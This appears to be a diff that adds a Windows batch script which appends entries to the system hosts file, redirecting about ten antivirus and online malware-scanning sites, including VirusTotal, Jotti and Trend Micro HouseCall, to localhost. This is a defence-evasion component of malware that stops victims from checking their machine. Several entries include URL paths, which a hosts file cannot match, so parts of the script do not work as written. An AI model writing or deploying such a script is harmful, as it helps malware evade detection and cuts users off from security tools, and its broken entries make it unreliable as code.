@@ -1,0 +1,12 @@
+@echo off
+cd "C:\Windows\System32\Drivers\etc"
+echo 127.0.0.1 quickscan.bitdefender.com >> "Hosts"
+echo 127.0.0.1 www.pandasecurity.com/activescan/index >> "Hosts"
+echo 127.0.0.1 housecall.trendmicro.com >> "Hosts"
+echo 127.0.0.1 www.f-secure.com/en/web/home_global/online-scanner >> "Hosts"
+echo 127.0.0.1 virscan.org >> "Hosts"
+echo 127.0.0.1 www.virustotal.com >> "Hosts"
+echo 127.0.0.1 virusscan.jotti.org/en >> "Hosts"
+echo 127.0.0.1 www.eset.com/us/online-scanner >> "Hosts"
+echo 127.0.0.1 www.metascan-online.com/ >> "Hosts"
+echo 127.0.0.1 www.bullguard.com/bullguard-security-center/pc-security/computer-threats/online_virus_scan.aspx >> "Hosts"
